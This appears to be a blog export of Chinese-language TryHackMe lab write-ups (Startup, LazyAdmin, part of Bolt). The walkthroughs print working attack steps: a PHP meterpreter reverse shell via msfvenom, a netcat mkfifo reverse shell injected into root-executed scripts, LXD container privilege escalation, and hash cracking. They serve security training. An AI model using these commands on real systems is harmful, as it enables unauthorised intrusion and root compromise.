src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006153331301-1480645588.png" alt="image-20241006153329663"></p><p>直接在当前目录找到<code>user.txt</code></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p><code>sudo -l</code>由于缺少密码利用不了，查看其他内容时也没有可以利用的信息</p><p>使用<code>id</code>查看一下当前权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006153616066-342538492.png" alt="image-20241006153614508"></p><p>发现可以利用<code>lxd</code>提权</p><ul><li>攻击机准备</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通过git将构建好的alpine镜像克隆至本地；执行“build -alpine”命令完成最新版本的Alpine镜像构建，此操作必须由root用户完成</span><br><span class="line">将tar文件发送至目标设备</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line">运行完上述命令之后，会在当前目录下创建一个tar.gz文件，之后我们需要将其发送至目标系统</span><br><span class="line"></span><br><span class="line">另一方面，我们还需要将alpine镜像发送至目标系统的/tmp目录中</span><br><span class="line">python -m http.server 8081</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160509601-1470459792.png" alt="image-20241006160508143"></p><ul><li>靶机操作</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://10.11.101.220:8081/apline-v3.10-x86_64-20191008_1227.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160621679-466446020.png" alt="image-20241006160620196"></p><p>镜像构建完成之后，我们就可以将其以镜像的形式添加进LXD了</p><p><code>lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage</code></p><p>使用<code>lxc image list</code>命令即可检查可用的容器列表</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160943758-117140868.png" alt="image-20241006160942338"></p><p>执行以下命令进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006161123649-1743013902.png" alt="image-20241006161122252"></p><p>进入容器之后，定位到<code>/mnt/root</code>即可查看目标主机设备的所有资源。运行了Bash脚本之后，我们将得到一个特殊的Shell，也就是容器的Shell。这个容器中包含了目标主机的全部资源</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006161422968-662607515.png" alt="image-20241006161421526"></p><p>最后在<code>/mnt/root/root</code>下找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Startup</title>
      <link href="/posts/d57c7ddd.html"/>
      <url>/posts/d57c7ddd.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.45.30</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.45.30</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 19:41 CST</span><br><span class="line">mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers: No such file or directory (2)</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 10.10.45.30</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]</span><br><span class="line">| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg</span><br><span class="line">|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.11.101.220</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)</span><br><span class="line">|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)</span><br><span class="line">|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Maintenance</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.40 seconds</span><br></pre></td></tr></table></figure><p>发现存在21，22，80端口，其中21端口可以匿名登录</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>直接匿名登录</p><p><code>ftp anonymous@10.10.45.30</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001194636259-1717138662.png" alt="image-20241001194628456"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001194933862-1716586471.png" alt="image-20241001194926284"></p><p>发现存在一些文件全部<code>get</code>下来，其中<code>ftp</code>目录是空的</p><h2 id="ftp文件分析"><a href="#ftp文件分析" class="headerlink" title="ftp文件分析"></a>ftp文件分析</h2><ul><li><code>important.jpg</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195241174-1196545580.png" alt="image-20241001195233137"></p><p>没啥用</p><ul><li><code>notice.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195329943-334597323.png" alt="image-20241001195322711"></p><p>看样子貌似跟下载文件有关？（并不确定）</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195527538-1538863478.png" alt="image-20241001195519953"></p><p>首页什么也没有，直接扫目录</p><p><code>gobuster dir -u http://10.10.45.30/ -w /usr/share/wordlists/dirb/common.txt -z</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001200104194-693790804.png" alt="image-20241001200056829"></p><p>发现存在<code>/files</code>路由，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001200145197-2050816862.png" alt="image-20241001200137927"></p><p>发现是我们通过<code>ftp</code>匿名登录获得的内容</p><h1 id="获取主机权限"><a href="#获取主机权限" class="headerlink" title="获取主机权限"></a>获取主机权限</h1><h2 id="MSF获取普通权限"><a href="#MSF获取普通权限" class="headerlink" title="MSF获取普通权限"></a>MSF获取普通权限</h2><p>发现在<code>ftp</code>中的文件可以在<code>http</code>中访问到，所以我们就可以通过<code>ftp</code>上传木马，通过<code>http</code>执行，从而获得服务器的权限</p><p>在之前我们从<code>ftp</code>下载文件的时候发现<code>ftp</code>目录是具有可写权限的，所以我们就通过这个目录上传文件</p><p>先生成一个php反弹shell的木马</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201240718-6841116.png" alt="image-20241001201232855"></p><p>将该木马传到机器的ftp目录下，此时通过http可以查看到此文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201325202-1889182470.png" alt="image-20241001201317928"></p><p>使用msf创建一个监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler# 使用 exploit/multi/handler 模块</span><br><span class="line">set  payload php/meterpreter/reverse_tcp# 设置php的攻击负载payload</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201533813-1700211541.png" alt="image-20241001201526055"></p><p>将参数设置好</p><p><code>set LHOST  10.11.101.220</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201702538-1525155851.png" alt="image-20241001201655307"></p><p><code>run</code>启动</p><p>在http上点击<code>shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201750120-518358356.png" alt="image-20241001201742671"></p><p>msf回连成功</p><p>利用<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>拿到交互式shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201904169-1947917994.png" alt="image-20241001201856845"></p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241001201949796.png" alt="image-20241001201949796"></p><p>在<code>/home</code>目录下发现<code>lennie</code>目录，但是我们没有权限访问</p><h2 id="Wireshark流量分析"><a href="#Wireshark流量分析" class="headerlink" title="Wireshark流量分析"></a>Wireshark流量分析</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202229662-246877002.png" alt="image-20241001202222169"></p><p>在根目录发现一些文件，查看一下</p><ul><li><code>recipe.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202335325-965983582.png" alt="image-20241001202328035"></p><p>还是没有什么可以利用的信息，继续查看别的内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202451791-1921428504.png" alt="image-20241001202444169"></p><p>在一个我们可以访问的<code>incidents</code>文件夹中发现一个流量包，通过http将其下载到本地</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202957544-1745101645.png" alt="image-20241001202949932"></p><p>将流量包转移至之前的ftp目录下，就可以通过http将文件下载到本地了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001203556445-214800003.png" alt="image-20241001203548668"></p><p>拿<code>Wireshark</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001204532595-900259921.png" alt="image-20241001204524749"></p><p>在流量包里发现疑似<code>lennie</code>用户的密码<code>c4ntg3t3n0ughsp1c3</code>，<code>ssh</code>尝试登陆一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001205517574-1258939451.png" alt="image-20241001205510001"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001205657732-1629873569.png" alt="image-20241001205650490"></p><p>在<code>/home/lennie</code>目录下找到<code>user.txt</code></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>继续寻找其他信息，在<code>/home/lennie/Documents</code>下发现一些<code>txt</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210158295-521315857.png" alt="image-20241001210151013"></p><p>在<code>/home/lennie/scripts</code>下找到<code>sh</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210347977-2088833048.png" alt="image-20241001210340532"></p><p>查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210321820-713500301.png" alt="image-20241001210314585"></p><p>继续查看一下<code>/etc/print.sh</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210437858-314517372.png" alt="image-20241001210430409"></p><p>我们又可以写入反弹的shell到<code>/etc/print.sh</code>文件中，然后通过<code>planner.sh</code>调用来获得root权限</p><p><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.101.220 4445 &gt;/tmp/f&quot; &gt;/etc/print.sh</code></p><p>执行将上述命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210720380-89700049.png" alt="image-20241001210713124"></p><p>起一个新的监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210754289-499424149.png" alt="image-20241001210747046"></p><p>几乎是瞬间就接受到了反弹的shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210940417-178874238.png" alt="image-20241001210932745"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001211024288-765111761.png" alt="image-20241001211016797"></p><p>直接在当前目录就找到了<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-LazyAdmin</title>
      <link href="/posts/986850d6.html"/>
      <url>/posts/986850d6.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.36.50</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.36.50 -o out.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Tue Oct  1 13:28:01 2024 as: nmap -sS -sV -sC -o out.txt 10.10.36.50</span><br><span class="line">Nmap scan report for 10.10.36.50</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)</span><br><span class="line">|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)</span><br><span class="line">|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Tue Oct  1 13:28:39 2024 -- 1 IP address (1 host up) scanned in 38.00 seconds</span><br></pre></td></tr></table></figure><p>发现只有 22端口和80端口开放</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001133324081-920118799.png" alt="image-20241001133315429"></p><p>80端口是一个apache初始页面什么也没有，扫描一下目录</p><p><code>gobuster dir -u http://10.10.36.50/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001134445161-1128622157.png" alt="image-20241001134437572"></p><p>发现<code>/content</code>路由，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140344879-280931777.png" alt="image-20241001140337721"></p><p>发现是<code>SweetRice</code>站点，继续扫描目录</p><p><code>gobuster dir -u http://10.10.36.50/content -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140558172-1591267814.png" alt="image-20241001140550777"></p><p>这回发现了一些有意思的内容</p><p>在<code>/_themes</code>下，发现一些查看不了源码的php文件，并没有什么用</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140738542-1427503327.png" alt="image-20241001140731314"></p><p>在<code>/as</code>路由下找到登录口</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140820110-1638822951.png" alt="image-20241001140813239"></p><p><code>/attachment</code>路由下并没有什么信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140902177-336260211.png" alt="image-20241001140855448"></p><p>这里直接看<code>/inc</code>路由</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141015730-1826348733.png" alt="image-20241001141008810"></p><p>很明显看到数据库备份文件夹，将里面的<code>sql</code>文件下载到本地查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141141471-910671197.png" alt="image-20241001141134169"></p><p>发现该cms版本为1.5.1，且密码也有，用户名是<code>manager</code>，尝试hashcat破解密码，将密码保存为<code>passwd</code></p><p><code>hashcat -a 0 -m 0 passwd /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141730815-751946977.png" alt="image-20241001141723708"></p><p>发现成功破解密码，密码是<code>Password123</code></p><p>尝试通过<code>as</code>路由登录<code>manager</code>账户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141932514-1784118097.png" alt="image-20241001141925338"></p><p>登录成功，同时可以确认该cms版本号为1.5.1</p><h1 id="MSF获取权限"><a href="#MSF获取权限" class="headerlink" title="MSF获取权限"></a>MSF获取权限</h1><p>启动msf，<code>search</code>一下该cms，看看能否有可以直接利用的漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001142416137-2123494996.png" alt="image-20241001142409002"></p><p>很可惜，没有可以直接用的，但是<code>searchsploit</code>发现了可以利用的，其中<code>Backup Disclosure</code>我们之前手动实现了，并登陆到了后台</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001142447599-1728977571.png" alt="image-20241001142440531"></p><p>但是我们可以利用其他的，比如<code>Arbitrary File Upload</code>，我们可以通过这个漏洞上传shell，这里使用msf进行反弹shell</p><p>先使用msf创建一个监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler# 使用 exploit/multi/handler 模块</span><br><span class="line">set  payload php/meterpreter/reverse_tcp# 设置php的攻击负载payload</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001143752057-1728671297.png" alt="image-20241001143744773"></p><p>将需要的选项填好</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001143817667-1736957141.png" alt="image-20241001143810923"></p><p>设置好监听器后，生成php反弹shell</p><p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=10.11.101.220   lport=4444 R&gt;shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001144930162-200383647.png" alt="image-20241001144922924"></p><p>在<code>http://10.10.36.50/content/as/?type=media_center</code>处，将文件传上去</p><p>传<code>.php</code>文件时，发现并没有反应，将文件后缀改为<code>.phtml</code>，成功上传</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001145344237-1734699769.png" alt="image-20241001145337432"></p><p>在msf中<code>run</code>执行，在点击当前页面的<code>shell.phtml</code>文件，此时发现shell成功弹回来了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001150642271-505446254.png" alt="image-20241001150634947"></p><p>换成交互式shell</p><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001150826924-1862349482.png" alt="image-20241001150820149"></p><p>在<code>/home/itguy</code>下找到<code>user.txt</code></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>输入<code>sudo -l</code>查看是否有可以利用了命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151250536-1508069797.png" alt="image-20241001151243232"></p><p>只发现了一条</p><p><code>(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl</code></p><p>查看一下<code>backup.pl</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151400028-565050480.png" alt="image-20241001151353310"></p><p>发现只是调用<code>/etc/copy.sh</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151602948-2027858445.png" alt="image-20241001151555700"></p><p>通过仔细查看两个文件后发现，我们不能修改<code>backup.pl</code>但是可以改<code>/etc/copy.sh</code>文件的内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151800210-1044518594.png" alt="image-20241001151753242"></p><p>查看<code>/etc/copy.sh</code>文件后发现，内容是反弹shell的命令，将其修改成自己的ip和port</p><p><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.101.220 4445 &gt;/tmp/f&quot; &gt;/etc/copy.sh</code></p><p>另起一个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153450910-287086362.png" alt="image-20241001153444215"></p><p>在msf终端shell里执行命令</p><p><code>sudo /usr/bin/perl /home/itguy/backup.pl</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153547891-1980282670.png" alt="image-20241001153541191"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153900832-1299349622.png" alt="image-20241001153853757"></p><p>可以看到在新的shell里获得了root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153956587-989090601.png" alt="image-20241001153949813"></p><p>最后在<code>/root</code>下找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Bolt</title>
      <link href="/posts/a58b6669.html"/>
      <url>/posts/a58b6669.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p> 靶机ip：10.10.48.19</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.48.19</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Tue Oct  1 10:13:36 2024 as: nmap -sS -sV -sC -o out.txt 10.10.48.19</span><br><span class="line">Nmap scan report for 10.10.48.19</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)</span><br><span class="line">|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)</span><br><span class="line">|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">8000/tcp open  http    (PHP 7.2.32-1)</span><br><span class="line">|_http-title: Bolt | A hero is unleashed</span><br><span class="line">|_http-generator: Bolt</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1</span><br><span class="line">|     Cache-Control: private, must-revalidate</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     pragma: no-cache</span><br><span class="line">|     expires: -1</span><br><span class="line">|     X-Debug-Token: 5d427e</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     